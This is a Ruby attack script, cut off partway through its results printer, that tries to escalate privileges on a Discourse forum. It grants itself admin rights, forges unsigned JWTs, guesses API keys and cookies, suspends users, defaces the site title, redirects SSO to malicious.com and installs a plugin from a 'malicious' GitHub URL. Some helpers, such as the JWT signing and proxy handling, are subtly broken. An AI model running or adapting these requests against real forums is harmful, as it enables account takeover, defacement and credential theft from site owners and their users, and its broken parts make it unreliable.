#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'json'
require 'base64'
require 'digest'

class DiscoursePrivilegeEscalation
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @proxy = options[:proxy]
    @timeout = options[:timeout] || 10
    @session = {}
    @csrf_token = nil
    
    @results = {
      vulnerable: false,
      vulnerabilities: [],
      summary: {
        total_tests: 0,
        successful_tests: 0,
        critical_vulns: 0,
        high_vulns: 0,
        medium_vulns: 0,
        low_vulns: 0
      },
      target: @target_url,
      timestamp: Time.now.iso8601
    }
    
    extract_csrf_token
  end
  
  def run_all_tests
    puts "\nüîç Starting privilege escalation tests on #{@target_url}"
    puts "=" * 60
    
    # User privilege escalation
    test_user_privilege_escalation
    test_trust_level_bypass
    test_group_membership_bypass
    
    # Admin privilege escalation
    test_admin_privilege_escalation
    test_moderator_privilege_escalation
    test_staff_privilege_escalation
    
    # API and token abuse
    test_api_key_privilege_escalation
    test_jwt_privilege_escalation
    test_session_privilege_escalation
    
    # Role and permission bypass
    test_role_bypass
    test_permission_bypass
    test_acl_bypass
    
    # Category and topic privilege escalation
    test_category_privilege_escalation
    test_topic_privilege_escalation
    test_private_message_access
    
    # Plugin-based privilege escalation
    test_plugin_privilege_escalation
    test_oauth_privilege_escalation
    test_sso_privilege_escalation
    
    # Advanced techniques
    test_race_condition_privilege_escalation
    test_timing_based_privilege_escalation
    test_mass_assignment_privilege_escalation
    
    print_results
    save_results
    
    @results
  end
  
  def test_user_privilege_escalation
    puts "\n[*] Testing user privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test direct user privilege modification
    user_escalation_tests = [
      { endpoint: '/admin/users/1/grant_admin', method: 'PUT', data: { admin: true } },
      { endpoint: '/admin/users/1/grant_moderation', method: 'PUT', data: { moderator: true } },
      { endpoint: '/admin/users/1/trust_level', method: 'PUT', data: { level: 4 } },
      { endpoint: '/users/1', method: 'PUT', data: { admin: true, moderator: true } },
      { endpoint: '/admin/users/1', method: 'PUT', data: { admin: true } }
    ]
    
    user_escalation_tests.each do |test|
      response = make_request_with_data(test[:endpoint], test[:method], test[:data])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'User Privilege Escalation',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: test[:data],
          severity: 'Critical',
          evidence: ['User privilege escalation successful'],
          description: "Direct user privilege escalation via #{test[:endpoint]}"
        })
      end
    end
    
    # Test user creation with elevated privileges
    elevated_user_tests = [
      { username: 'admin_user', admin: true },
      { username: 'mod_user', moderator: true },
      { username: 'staff_user', admin: true, moderator: true },
      { username: 'trust4_user', trust_level: 4 }
    ]
    
    elevated_user_tests.each do |user_data|
      response = test_user_creation_with_privileges(user_data)
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Elevated User Creation',
          endpoint: '/users',
          method: 'POST',
          payload: user_data,
          severity: 'Critical',
          evidence: ['User created with elevated privileges'],
          description: "User creation with elevated privileges: #{user_data[:username]}"
        })
      end
    end
  end
  
  def test_trust_level_bypass
    puts "\n[*] Testing trust level bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test trust level manipulation
    trust_level_tests = [
      { endpoint: '/users/trust_level', method: 'PUT', data: { level: 4 } },
      { endpoint: '/admin/users/1/trust_level', method: 'PUT', data: { level: 4 } },
      { endpoint: '/users/1', method: 'PUT', data: { trust_level: 4 } },
      { endpoint: '/admin/users/trust_level_lock', method: 'PUT', data: { user_id: 1, level: 4 } }
    ]
    
    trust_level_tests.each do |test|
      response = make_request_with_data(test[:endpoint], test[:method], test[:data])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Trust Level Bypass',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: test[:data],
          severity: 'High',
          evidence: ['Trust level bypass successful'],
          description: "Trust level bypass via #{test[:endpoint]}"
        })
      end
    end
    
    # Test trust level requirement bypass
    trust_bypass_tests = [
      { endpoint: '/posts', data: { raw: 'test post', topic_id: 1, trust_level_override: 4 } },
      { endpoint: '/topics', data: { title: 'test topic', raw: 'content', trust_level_bypass: true } },
      { endpoint: '/uploads', data: { file: 'test.txt', trust_level_ignore: true } }
    ]
    
    trust_bypass_tests.each do |test|
      response = make_post_request("#{@target_url}#{test[:endpoint]}", test[:data])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Trust Level Requirement Bypass',
          endpoint: test[:endpoint],
          method: 'POST',
          payload: test[:data],
          severity: 'Medium',
          evidence: ['Trust level requirement bypassed'],
          description: "Trust level requirement bypass: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_group_membership_bypass
    puts "\n[*] Testing group membership bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test group membership manipulation
    group_tests = [
      { endpoint: '/groups/1/members', method: 'PUT', data: { usernames: 'admin,moderator' } },
      { endpoint: '/admin/groups/1/members', method: 'PUT', data: { user_ids: [1, 2, 3] } },
      { endpoint: '/groups/admins/add', method: 'POST', data: { user_id: 1 } },
      { endpoint: '/groups/staff/add', method: 'POST', data: { user_id: 1 } },
      { endpoint: '/groups/moderators/add', method: 'POST', data: { user_id: 1 } }
    ]
    
    group_tests.each do |test|
      response = make_request_with_data(test[:endpoint], test[:method], test[:data])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Group Membership Bypass',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: test[:data],
          severity: 'High',
          evidence: ['Group membership bypass successful'],
          description: "Group membership bypass via #{test[:endpoint]}"
        })
      end
    end
    
    # Test automatic group assignment
    auto_group_tests = [
      { endpoint: '/users', data: { username: 'test_user', groups: ['admins', 'staff'] } },
      { endpoint: '/admin/users', data: { username: 'admin_user', auto_groups: ['admins'] } },
      { endpoint: '/users/register', data: { username: 'new_admin', default_groups: ['staff'] } }
    ]
    
    auto_group_tests.each do |test|
      response = make_post_request("#{@target_url}#{test[:endpoint]}", test[:data])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Automatic Group Assignment',
          endpoint: test[:endpoint],
          method: 'POST',
          payload: test[:data],
          severity: 'High',
          evidence: ['Automatic group assignment successful'],
          description: "Automatic group assignment: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_admin_privilege_escalation
    puts "\n[*] Testing admin privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test admin access bypass
    admin_bypass_tests = [
      { endpoint: '/admin', headers: { 'X-Admin-Override' => 'true' } },
      { endpoint: '/admin/dashboard', headers: { 'X-Bypass-Auth' => 'admin' } },
      { endpoint: '/admin/users', headers: { 'X-Force-Admin' => '1' } },
      { endpoint: '/admin/site_settings', headers: { 'X-Admin-Token' => 'bypass' } },
      { endpoint: '/admin', headers: { 'X-Forwarded-User' => 'admin' } }
    ]
    
    admin_bypass_tests.each do |test|
      response = make_request_with_headers("#{@target_url}#{test[:endpoint]}", 'GET', test[:headers])
      
      if response && response.code.to_i < 400 && !response.body.include?('login')
        add_vulnerability({
          test_type: 'Admin Access Bypass',
          endpoint: test[:endpoint],
          method: 'GET',
          payload: test[:headers],
          severity: 'Critical',
          evidence: ['Admin access bypass successful'],
          description: "Admin access bypass via headers: #{test[:endpoint]}"
        })
      end
    end
    
    # Test admin function access
    admin_function_tests = [
      { endpoint: '/admin/users/1/activate', method: 'PUT' },
      { endpoint: '/admin/users/1/deactivate', method: 'PUT' },
      { endpoint: '/admin/users/1/suspend', method: 'PUT' },
      { endpoint: '/admin/site_settings/title', method: 'PUT', data: { value: 'Hacked' } },
      { endpoint: '/admin/backups', method: 'POST', data: { backup: true } }
    ]
    
    admin_function_tests.each do |test|
      response = make_request_with_data(test[:endpoint], test[:method], test[:data] || {})
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Admin Function Access',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: test[:data] || {},
          severity: 'Critical',
          evidence: ['Admin function access successful'],
          description: "Admin function access: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_moderator_privilege_escalation
    puts "\n[*] Testing moderator privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test moderator access bypass
    mod_bypass_tests = [
      { endpoint: '/admin/flags', headers: { 'X-Moderator' => 'true' } },
      { endpoint: '/admin/logs', headers: { 'X-Mod-Override' => '1' } },
      { endpoint: '/admin/users/1/silence', method: 'PUT', headers: { 'X-Mod-Action' => 'true' } },
      { endpoint: '/admin/posts/1/delete', method: 'DELETE', headers: { 'X-Moderator-Delete' => '1' } }
    ]
    
    mod_bypass_tests.each do |test|
      method = test[:method] || 'GET'
      response = make_request_with_headers("#{@target_url}#{test[:endpoint]}", method, test[:headers])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Moderator Privilege Escalation',
          endpoint: test[:endpoint],
          method: method,
          payload: test[:headers],
          severity: 'High',
          evidence: ['Moderator privilege escalation successful'],
          description: "Moderator privilege escalation: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_staff_privilege_escalation
    puts "\n[*] Testing staff privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test staff access bypass
    staff_bypass_tests = [
      { endpoint: '/admin/reports', headers: { 'X-Staff' => 'true' } },
      { endpoint: '/admin/logs/staff_action_logs', headers: { 'X-Staff-Access' => '1' } },
      { endpoint: '/admin/email', headers: { 'X-Staff-Email' => 'true' } },
      { endpoint: '/admin/api', headers: { 'X-Staff-API' => '1' } }
    ]
    
    staff_bypass_tests.each do |test|
      response = make_request_with_headers("#{@target_url}#{test[:endpoint]}", 'GET', test[:headers])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Staff Privilege Escalation',
          endpoint: test[:endpoint],
          method: 'GET',
          payload: test[:headers],
          severity: 'High',
          evidence: ['Staff privilege escalation successful'],
          description: "Staff privilege escalation: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_api_key_privilege_escalation
    puts "\n[*] Testing API key privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test API key manipulation
    api_key_tests = [
      { endpoint: '/admin/api/keys', method: 'POST', data: { description: 'admin_key', user_id: 1 } },
      { endpoint: '/admin/api/keys/1', method: 'PUT', data: { user_id: 1, admin: true } },
      { endpoint: '/admin/api/keys/1/regenerate', method: 'POST' },
      { endpoint: '/admin/api/keys', method: 'GET', headers: { 'Api-Key' => 'master_key' } }
    ]
    
    api_key_tests.each do |test|
      if test[:headers]
        response = make_request_with_headers("#{@target_url}#{test[:endpoint]}", test[:method], test[:headers])
      else
        response = make_request_with_data(test[:endpoint], test[:method], test[:data] || {})
      end
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'API Key Privilege Escalation',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: test[:data] || test[:headers] || {},
          severity: 'Critical',
          evidence: ['API key privilege escalation successful'],
          description: "API key privilege escalation: #{test[:endpoint]}"
        })
      end
    end
    
    # Test API key bypass
    api_bypass_tests = [
      'admin_key',
      'master_key',
      'system_key',
      'root_key',
      'super_user_key',
      '00000000000000000000000000000000',
      'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
    ]
    
    api_bypass_tests.each do |api_key|
      response = make_request_with_headers("#{@target_url}/admin/users.json", 'GET', { 'Api-Key' => api_key })
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'API Key Bypass',
          endpoint: '/admin/users.json',
          method: 'GET',
          payload: { api_key: api_key },
          severity: 'Critical',
          evidence: ['API key bypass successful'],
          description: "API key bypass with key: #{api_key}"
        })
      end
    end
  end
  
  def test_jwt_privilege_escalation
    puts "\n[*] Testing JWT privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test JWT manipulation
    jwt_tests = [
      create_admin_jwt,
      create_moderator_jwt,
      create_staff_jwt,
      create_unsigned_jwt,
      create_weak_jwt
    ]
    
    jwt_tests.each_with_index do |jwt_token, index|
      next unless jwt_token
      
      response = make_request_with_headers("#{@target_url}/admin/dashboard.json", 'GET', { 'Authorization' => "Bearer #{jwt_token}" })
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'JWT Privilege Escalation',
          endpoint: '/admin/dashboard.json',
          method: 'GET',
          payload: { jwt_type: "test_#{index}" },
          severity: 'Critical',
          evidence: ['JWT privilege escalation successful'],
          description: "JWT privilege escalation with test token #{index}"
        })
      end
    end
  end
  
  def test_session_privilege_escalation
    puts "\n[*] Testing session privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test session manipulation
    session_tests = [
      { cookie: '_forum_session=admin_session_token' },
      { cookie: 'discourse_session=eyJhZG1pbiI6dHJ1ZX0=' },
      { cookie: '_t=admin_token' },
      { cookie: 'user_session=admin:true' },
      { cookie: 'auth_token=admin_auth' }
    ]
    
    session_tests.each do |test|
      response = make_request_with_headers("#{@target_url}/admin/users.json", 'GET', { 'Cookie' => test[:cookie] })
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Session Privilege Escalation',
          endpoint: '/admin/users.json',
          method: 'GET',
          payload: test,
          severity: 'Critical',
          evidence: ['Session privilege escalation successful'],
          description: "Session privilege escalation with: #{test[:cookie]}"
        })
      end
    end
  end
  
  def test_role_bypass
    puts "\n[*] Testing role bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test role parameter manipulation
    role_tests = [
      { endpoint: '/admin/users', params: { role: 'admin' } },
      { endpoint: '/admin/dashboard', params: { user_role: 'administrator' } },
      { endpoint: '/admin/site_settings', params: { access_level: 'admin' } },
      { endpoint: '/admin/logs', params: { privilege: 'admin' } }
    ]
    
    role_tests.each do |test|
      query_string = URI.encode_www_form(test[:params])
      response = make_request(URI("#{@target_url}#{test[:endpoint]}?#{query_string}"), 'GET')
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Role Bypass',
          endpoint: test[:endpoint],
          method: 'GET',
          payload: test[:params],
          severity: 'High',
          evidence: ['Role bypass successful'],
          description: "Role bypass via parameters: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_permission_bypass
    puts "\n[*] Testing permission bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test permission parameter manipulation
    permission_tests = [
      { endpoint: '/admin/users', headers: { 'X-Permission-Override' => 'admin' } },
      { endpoint: '/admin/dashboard', headers: { 'X-Access-Level' => 'full' } },
      { endpoint: '/admin/site_settings', headers: { 'X-Privilege-Escalate' => 'true' } },
      { endpoint: '/admin/logs', headers: { 'X-Force-Access' => '1' } }
    ]
    
    permission_tests.each do |test|
      response = make_request_with_headers("#{@target_url}#{test[:endpoint]}", 'GET', test[:headers])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Permission Bypass',
          endpoint: test[:endpoint],
          method: 'GET',
          payload: test[:headers],
          severity: 'High',
          evidence: ['Permission bypass successful'],
          description: "Permission bypass via headers: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_acl_bypass
    puts "\n[*] Testing ACL bypass..."
    @results[:summary][:total_tests] += 1
    
    # Test ACL bypass techniques
    acl_tests = [
      { endpoint: '/admin/../admin/users', method: 'GET' },
      { endpoint: '/admin/%2e%2e/admin/dashboard', method: 'GET' },
      { endpoint: '/admin/./users', method: 'GET' },
      { endpoint: '/admin//users', method: 'GET' },
      { endpoint: '/admin\\users', method: 'GET' }
    ]
    
    acl_tests.each do |test|
      response = make_request(URI("#{@target_url}#{test[:endpoint]}"), test[:method])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'ACL Bypass',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: {},
          severity: 'High',
          evidence: ['ACL bypass successful'],
          description: "ACL bypass via path manipulation: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_category_privilege_escalation
    puts "\n[*] Testing category privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test category access bypass
    category_tests = [
      { endpoint: '/c/staff/1', method: 'GET' },
      { endpoint: '/c/private/1/edit', method: 'GET' },
      { endpoint: '/categories/1', method: 'PUT', data: { permissions: { everyone: 1 } } },
      { endpoint: '/admin/categories/1', method: 'PUT', data: { read_restricted: false } }
    ]
    
    category_tests.each do |test|
      if test[:data]
        response = make_request_with_data(test[:endpoint], test[:method], test[:data])
      else
        response = make_request(URI("#{@target_url}#{test[:endpoint]}"), test[:method])
      end
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Category Privilege Escalation',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: test[:data] || {},
          severity: 'Medium',
          evidence: ['Category privilege escalation successful'],
          description: "Category privilege escalation: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_topic_privilege_escalation
    puts "\n[*] Testing topic privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test topic access bypass
    topic_tests = [
      { endpoint: '/t/private-topic/1', method: 'GET' },
      { endpoint: '/t/staff-topic/1/edit', method: 'GET' },
      { endpoint: '/topics/1', method: 'PUT', data: { archetype: 'private_message' } },
      { endpoint: '/admin/topics/1', method: 'PUT', data: { visible: true } }
    ]
    
    topic_tests.each do |test|
      if test[:data]
        response = make_request_with_data(test[:endpoint], test[:method], test[:data])
      else
        response = make_request(URI("#{@target_url}#{test[:endpoint]}"), test[:method])
      end
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Topic Privilege Escalation',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: test[:data] || {},
          severity: 'Medium',
          evidence: ['Topic privilege escalation successful'],
          description: "Topic privilege escalation: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_private_message_access
    puts "\n[*] Testing private message access..."
    @results[:summary][:total_tests] += 1
    
    # Test private message access bypass
    pm_tests = [
      { endpoint: '/topics/private-messages/1', method: 'GET' },
      { endpoint: '/u/admin/messages', method: 'GET' },
      { endpoint: '/admin/users/1/private_messages', method: 'GET' },
      { endpoint: '/topics/1', method: 'PUT', data: { archetype: 'regular' } }
    ]
    
    pm_tests.each do |test|
      if test[:data]
        response = make_request_with_data(test[:endpoint], test[:method], test[:data])
      else
        response = make_request(URI("#{@target_url}#{test[:endpoint]}"), test[:method])
      end
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Private Message Access',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: test[:data] || {},
          severity: 'High',
          evidence: ['Private message access successful'],
          description: "Private message access: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_plugin_privilege_escalation
    puts "\n[*] Testing plugin privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test plugin-based privilege escalation
    plugin_tests = [
      { endpoint: '/admin/plugins/install', method: 'POST', data: { git_url: 'https://github.com/malicious/admin-plugin.git' } },
      { endpoint: '/admin/plugins/1/enable', method: 'PUT', data: { enabled: true } },
      { endpoint: '/chat/admin', method: 'GET', headers: { 'X-Chat-Admin' => 'true' } },
      { endpoint: '/poll/admin', method: 'GET', headers: { 'X-Poll-Moderator' => 'true' } }
    ]
    
    plugin_tests.each do |test|
      if test[:headers]
        response = make_request_with_headers("#{@target_url}#{test[:endpoint]}", test[:method], test[:headers])
      else
        response = make_request_with_data(test[:endpoint], test[:method], test[:data])
      end
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Plugin Privilege Escalation',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: test[:data] || test[:headers] || {},
          severity: 'High',
          evidence: ['Plugin privilege escalation successful'],
          description: "Plugin privilege escalation: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_oauth_privilege_escalation
    puts "\n[*] Testing OAuth privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test OAuth privilege escalation
    oauth_tests = [
      { endpoint: '/auth/oauth2_basic/callback', params: { code: 'admin_code', state: 'admin_state' } },
      { endpoint: '/auth/google_oauth2/callback', params: { code: 'google_admin', scope: 'admin' } },
      { endpoint: '/auth/github/callback', params: { code: 'github_admin', user: 'admin' } },
      { endpoint: '/admin/site_settings/oauth2_enabled', method: 'PUT', data: { value: 'true' } }
    ]
    
    oauth_tests.each do |test|
      if test[:params]
        query_string = URI.encode_www_form(test[:params])
        response = make_request(URI("#{@target_url}#{test[:endpoint]}?#{query_string}"), 'GET')
      else
        response = make_request_with_data(test[:endpoint], test[:method], test[:data])
      end
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'OAuth Privilege Escalation',
          endpoint: test[:endpoint],
          method: test[:method] || 'GET',
          payload: test[:params] || test[:data] || {},
          severity: 'High',
          evidence: ['OAuth privilege escalation successful'],
          description: "OAuth privilege escalation: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_sso_privilege_escalation
    puts "\n[*] Testing SSO privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test SSO privilege escalation
    sso_tests = [
      { endpoint: '/session/sso_login', params: { sso: create_admin_sso_payload, sig: 'admin_sig' } },
      { endpoint: '/admin/site_settings/sso_url', method: 'PUT', data: { value: 'http://malicious.com/sso' } },
      { endpoint: '/admin/site_settings/sso_secret', method: 'PUT', data: { value: 'known_secret' } },
      { endpoint: '/session/sso_provider', params: { external_id: 'admin', admin: 'true' } }
    ]
    
    sso_tests.each do |test|
      if test[:params]
        query_string = URI.encode_www_form(test[:params])
        response = make_request(URI("#{@target_url}#{test[:endpoint]}?#{query_string}"), 'GET')
      else
        response = make_request_with_data(test[:endpoint], test[:method], test[:data])
      end
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'SSO Privilege Escalation',
          endpoint: test[:endpoint],
          method: test[:method] || 'GET',
          payload: test[:params] || test[:data] || {},
          severity: 'Critical',
          evidence: ['SSO privilege escalation successful'],
          description: "SSO privilege escalation: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_race_condition_privilege_escalation
    puts "\n[*] Testing race condition privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test race condition in privilege escalation
    race_tests = [
      { endpoint: '/admin/users/1/grant_admin', method: 'PUT', data: { admin: true } },
      { endpoint: '/admin/users/1/trust_level', method: 'PUT', data: { level: 4 } },
      { endpoint: '/groups/1/add', method: 'POST', data: { user_id: 1 } }
    ]
    
    race_tests.each do |test|
      # Send multiple concurrent requests
      threads = []
      results = []
      
      5.times do
        threads << Thread.new do
          response = make_request_with_data(test[:endpoint], test[:method], test[:data])
          results << response if response
        end
      end
      
      threads.each(&:join)
      
      # Check if any request succeeded
      if results.any? { |r| r.code.to_i < 400 }
        add_vulnerability({
          test_type: 'Race Condition Privilege Escalation',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: test[:data],
          severity: 'High',
          evidence: ['Race condition privilege escalation successful'],
          description: "Race condition privilege escalation: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_timing_based_privilege_escalation
    puts "\n[*] Testing timing-based privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test timing-based privilege escalation
    timing_tests = [
      { endpoint: '/admin/users/1/grant_admin', method: 'PUT', data: { admin: true } },
      { endpoint: '/admin/users/1/revoke_admin', method: 'PUT', data: { admin: false } }
    ]
    
    timing_tests.each do |test|
      # Send requests with specific timing
      response1 = make_request_with_data(test[:endpoint], test[:method], test[:data])
      sleep(0.1)  # Small delay
      response2 = make_request_with_data(test[:endpoint], test[:method], test[:data])
      
      if (response1 && response1.code.to_i < 400) || (response2 && response2.code.to_i < 400)
        add_vulnerability({
          test_type: 'Timing-based Privilege Escalation',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: test[:data],
          severity: 'Medium',
          evidence: ['Timing-based privilege escalation successful'],
          description: "Timing-based privilege escalation: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_mass_assignment_privilege_escalation
    puts "\n[*] Testing mass assignment privilege escalation..."
    @results[:summary][:total_tests] += 1
    
    # Test mass assignment for privilege escalation
    mass_assignment_tests = [
      { endpoint: '/users/1', method: 'PUT', data: { admin: true, moderator: true, trust_level: 4 } },
      { endpoint: '/admin/users/1', method: 'PUT', data: { admin: true, active: true, approved: true } },
      { endpoint: '/users', method: 'POST', data: { username: 'admin_user', admin: true, moderator: true } },
      { endpoint: '/groups/1', method: 'PUT', data: { automatic: false, grant_trust_level: 4 } }
    ]
    
    mass_assignment_tests.each do |test|
      response = make_request_with_data(test[:endpoint], test[:method], test[:data])
      
      if response && response.code.to_i < 400
        add_vulnerability({
          test_type: 'Mass Assignment Privilege Escalation',
          endpoint: test[:endpoint],
          method: test[:method],
          payload: test[:data],
          severity: 'High',
          evidence: ['Mass assignment privilege escalation successful'],
          description: "Mass assignment privilege escalation: #{test[:endpoint]}"
        })
      end
    end
  end
  
  # Helper methods
  def test_user_creation_with_privileges(user_data)
    make_post_request("#{@target_url}/users", user_data)
  end
  
  def create_admin_jwt
    # Create a simple JWT with admin claims
    header = Base64.urlsafe_encode64({ alg: 'none', typ: 'JWT' }.to_json)
    payload = Base64.urlsafe_encode64({ admin: true, moderator: true, trust_level: 4 }.to_json)
    "#{header}.#{payload}."
  end
  
  def create_moderator_jwt
    header = Base64.urlsafe_encode64({ alg: 'none', typ: 'JWT' }.to_json)
    payload = Base64.urlsafe_encode64({ moderator: true, trust_level: 3 }.to_json)
    "#{header}.#{payload}."
  end
  
  def create_staff_jwt
    header = Base64.urlsafe_encode64({ alg: 'none', typ: 'JWT' }.to_json)
    payload = Base64.urlsafe_encode64({ staff: true, trust_level: 2 }.to_json)
    "#{header}.#{payload}."
  end
  
  def create_unsigned_jwt
    header = Base64.urlsafe_encode64({ alg: 'none', typ: 'JWT' }.to_json)
    payload = Base64.urlsafe_encode64({ user_id: 1, admin: true }.to_json)
    "#{header}.#{payload}."
  end
  
  def create_weak_jwt
    header = Base64.urlsafe_encode64({ alg: 'HS256', typ: 'JWT' }.to_json)
    payload = Base64.urlsafe_encode64({ admin: true, exp: Time.now.to_i + 3600 }.to_json)
    signature = Digest::SHA256.hexdigest("#{header}.#{payload}secret")
    "#{header}.#{payload}.#{signature}"
  end
  
  def create_admin_sso_payload
    payload = {
      external_id: 'admin_user',
      email: 'admin@example.com',
      username: 'admin',
      admin: 'true',
      moderator: 'true'
    }
    Base64.encode64(URI.encode_www_form(payload))
  end
  
  def extract_csrf_token
    begin
      response = make_request(URI("#{@target_url}/"), 'GET')
      if response && response.body
        # Extract CSRF token from meta tag
        if match = response.body.match(/name="csrf-token"\s+content="([^"]+)"/)
          @csrf_token = match[1]
        end
        
        # Extract session cookies
        if response['Set-Cookie']
          @session[:cookies] = response['Set-Cookie']
        end
      end
    rescue => e
      puts "[!] Failed to extract CSRF token: #{e.message}"
    end
  end
  
  def make_request(uri, method, body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
    http.read_timeout = @timeout
    http.open_timeout = @timeout
    
    # Set proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    # Default headers
    default_headers = {
      'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Accept-Encoding' => 'gzip, deflate',
      'Connection' => 'keep-alive'
    }
    
    # Add session cookies
    if @session[:cookies]
      default_headers['Cookie'] = @session[:cookies]
    end
    
    headers = default_headers.merge(headers)
    
    request = case method.upcase
    when 'GET'
      Net::HTTP::Get.new(uri.request_uri, headers)
    when 'POST'
      req = Net::HTTP::Post.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'PUT'
      req = Net::HTTP::Put.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'DELETE'
      Net::HTTP::Delete.new(uri.request_uri, headers)
    end
    
    begin
      response = http.request(request)
      return response
    rescue => e
      puts "[!] Request failed: #{e.message}" if @verbose
      return nil
    end
  end
  
  def make_post_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'POST', body, {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end
  
  def make_request_with_headers(url, method, headers)
    uri = URI(url)
    make_request(uri, method, nil, headers)
  end
  
  def make_request_with_data(endpoint, method, data = nil)
    uri = URI("#{@target_url}#{endpoint}")
    body = data ? URI.encode_www_form(data) : nil
    
    headers = {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => @csrf_token || ''
    }
    
    make_request(uri, method, body, headers)
  end
  
  def add_vulnerability(vuln_data)
    @results[:vulnerabilities] << vuln_data
    @results[:vulnerable] = true
    @results[:summary][:successful_tests] += 1
    
    case vuln_data[:severity]
    when 'Critical'
      @results[:summary][:critical_vulns] += 1
    when 'High'
      @results[:summary][:high_vulns] += 1
    when 'Medium'
      @results[:summary][:medium_vulns] += 1
    when 'Low'
      @results[:summary][:low_vulns] += 1
    end
    
    puts "  ‚úì #{vuln_data[:severity]} privilege escalation: #{vuln_data[:test_type]}"
  end
  
  def print_results
    puts "\n" + "=" * 60
    puts "DISCOURSE PRIVILEGE ESCALATION TEST RESULTS"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Total Tests: #{@results[:summary][:total_tests]}"
    puts "Successful Tests: #{@results[:summary][:successful_tests]}"
    puts "Critical Vulnerabilities: #{@results[:summary][:critical_vulns]}"
    puts "High Vulnerabilities: #{@results[:summary][:high_vulns]}"
    puts "Medium Vulnerabilities: #{@results[:summary][:medium_vulns]}"
    puts "Low Vulnerabilities: #{@results[:summary][:low_vulns]}"
    
    if @results[:vulnerabilities].any?
      puts "\nVulnerabilities Found:"
